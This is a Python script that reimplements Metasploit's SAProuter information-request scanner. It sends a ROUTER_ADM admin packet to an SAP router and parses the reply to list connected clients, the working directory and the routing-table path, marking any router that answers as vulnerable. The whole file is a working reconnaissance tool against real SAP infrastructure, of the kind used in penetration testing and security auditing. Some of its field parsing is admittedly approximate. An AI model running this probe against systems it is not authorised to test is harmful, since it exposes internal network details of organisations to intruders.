"""
sap_router_info.py – SAProuter admin info request (CVE-equivalent to
Metasploit's auxiliary/scanner/sap/sap_router_info_request).

Sends a ROUTER_ADM info request to an SAProuter and parses the response
to extract connected clients, working directory, routing table path,
and other configuration details.

This is an information disclosure vulnerability: a properly secured
SAProuter should reject admin requests from external hosts.

Reference: https://github.com/rapid7/metasploit-framework/blob/master/
           modules/auxiliary/scanner/sap/sap_router_info_request.rb
"""

import socket
import struct


def saprouter_info_request(host: str, port: int = 3299,
                           timeout: float = 10) -> dict:
    """Send a ROUTER_ADM info request to an SAProuter.

    Args:
        host: SAProuter IP or hostname
        port: SAProuter port (default 3299)
        timeout: Connection timeout

    Returns dict with:
        vulnerable: bool — True if info was returned
        clients: list of dicts — connected client entries
        total_clients: int — total number of connected clients
        working_dir: str — SAProuter working directory
        routtab: str — path to routing table file
        raw_info: list of str — all info lines from the response
        error: str — error message if request failed
    """
    result = {
        "vulnerable": False,
        "clients": [],
        "total_clients": 0,
        "working_dir": "",
        "routtab": "",
        "raw_info": [],
        "error": "",
    }

    # Build ROUTER_ADM info request
    # Format: "ROUTER_ADM" + [0, version=0x26, cmd=2, 0, 0]
    admin_pkt = b"ROUTER_ADM" + struct.pack("bbbbb", 0, 0x26, 2, 0, 0)
    ni_packet = struct.pack("!I", len(admin_pkt)) + admin_pkt

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(ni_packet)

        # Read all response frames
        resp = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 100000:
                    break
        except socket.timeout:
            pass
        sock.close()

    except Exception as e:
        result["error"] = str(e)
        return result

    if len(resp) < 4:
        result["error"] = "No response from SAProuter"
        return result

    # Parse multi-frame NI response
    frames = []
    pos = 0
    while pos + 4 <= len(resp):
        flen = struct.unpack("!I", resp[pos:pos + 4])[0]
        if flen == 0:
            pos += 4
            break  # empty frame = end of response
        if pos + 4 + flen > len(resp):
            break
        payload = resp[pos + 4:pos + 4 + flen]
        frames.append(payload)
        pos += 4 + flen

    if not frames:
        result["error"] = "Empty response — admin request denied"
        return result

    # Check for error response
    if frames[0].startswith(b"NI_RTERR") or b"*ERR*" in frames[0]:
        result["error"] = "Admin request denied by SAProuter"
        return result

    # SAProuter responded with info — it's vulnerable
    result["vulnerable"] = True

    # Frame 0: Connection table (binary, fixed-width fields)
    # Structure per Metasploit: each entry is 46+46+30+2 = 124 bytes
    # First 8 bytes are header, then entries
    conn_frame = frames[0]
    if len(conn_frame) > 8:
        # Parse header
        header = conn_frame[:8]
        num_entries = struct.unpack("!I", header[:4])[0]
        conn_data = conn_frame[8:]

        # Each connection entry: 46 (source) + 46 (dest) + 30 (service) + 2 (pad) + 1 (flag)
        entry_size = 125  # approximate — depends on router version
        # Try to extract source hostnames from the connection data
        # The entries are null-terminated strings padded to fixed widths
        i = 0
        while i + 92 <= len(conn_data):
            # Source: first null-terminated string (up to 46 bytes)
            src_end = conn_data.find(b"\x00", i)
            if src_end < 0 or src_end > i + 46:
                src_end = i + 46
            src_raw = conn_data[i:src_end]
            # First 4 bytes may be binary IP — skip non-printable prefix
            src = src_raw.decode("ascii", errors="replace").strip()
            while src and ord(src[0]) < 32:
                src = src[1:]

            # Destination: next null-terminated string (up to 46 bytes from offset i+46)
            dst_start = i + 46
            dst_end = conn_data.find(b"\x00", dst_start)
            if dst_end < 0 or dst_end > dst_start + 46:
                dst_end = dst_start + 46
            dst = conn_data[dst_start:dst_end].decode("ascii", errors="replace").strip()

            # Service: next null-terminated string (up to 30 bytes from offset i+92)
            svc_start = i + 92
            svc_end = conn_data.find(b"\x00", svc_start)
            if svc_end < 0 or svc_end > svc_start + 30:
                svc_end = svc_start + 30
            svc = conn_data[svc_start:svc_end].decode("ascii", errors="replace").strip()

            if src:
                result["clients"].append({
                    "source": src,
                    "destination": dst,
                    "service": svc,
                })

            i += 125  # move to next entry (approximate)
            if i + 46 > len(conn_data):
                break

    # Remaining frames: text info lines (null-terminated strings)
    for frame in frames[1:]:
        text = frame.decode("ascii", errors="replace").rstrip("\x00").strip()
        if not text:
            continue

        # Strip leading non-printable bytes
        while text and (ord(text[0]) < 32 or ord(text[0]) > 126):
            text = text[1:]

        if not text:
            continue

        result["raw_info"].append(text)

        # Parse known fields
        if text.startswith("Total no. of clients:"):
            try:
                result["total_clients"] = int(text.split(":")[1].strip())
            except (ValueError, IndexError):
                pass
        elif "Working directory" in text and ":" in text:
            result["working_dir"] = text.split(":", 1)[1].strip()
        elif "Routtab" in text and ":" in text:
            result["routtab"] = text.split(":", 1)[1].strip()

    return result
